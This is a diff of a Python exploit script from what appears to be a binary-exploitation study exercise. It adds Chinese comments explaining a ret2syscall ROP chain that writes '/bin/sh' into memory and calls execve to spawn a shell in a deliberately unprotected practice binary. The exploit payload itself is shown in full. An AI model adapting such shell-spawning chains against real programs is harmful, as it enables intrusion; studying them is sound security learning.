@@ -1,7 +1,7 @@
 '''
 Author: 白银
 Date: 2023-01-02 15:36:47
-LastEditTime: 2023-01-02 17:01:58
+LastEditTime: 2023-01-02 20:12:43
 LastEditors: 白银
 Description: gcc question_5_test9_syscall.c -fno-stack-protector -no-pie -static -o question_5_x64_test9_syscall  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=1519.8&p=23
 Attention: ret2syscall
@@ -54,8 +54,10 @@ pop_rdx_ret = 0x4016ab
 bin_ssh_addr = 0x4B5241
 
 payload = flat(['a' * padding])
+# 执行 read(0, bin_ssh_addr, 0)  rax = 0, rdi = 0, rsi = bin_ssh_addr, rdx = 8
 payload += flat([pop_rax_ret, 0, pop_rdi_ret, 0, pop_rsi_ret, bin_ssh_addr, pop_rdx_ret, 8, syscall_addr]) # 8是因为/bin/sh占8个字节，要模仿read函数
-payload += flat([pop_rax_ret, 0x3b, pop_rdi_ret, bin_ssh_addr, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_addr]) # 0x3b就是execve
+# 执行 execve('/bin/sh', 0, 0)  rax = 59(=0x3b), rdi = bin_ssh_addr, rsi = , rdx = 0
+payload += flat([pop_rax_ret, 0x3b, pop_rdi_ret, bin_ssh_addr, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_addr]) # 0x3b就是execve; 每两个一组进行类似赋值操作，后数字给前，从最后开始数，上同
 
 delimiter = 'input:'
 
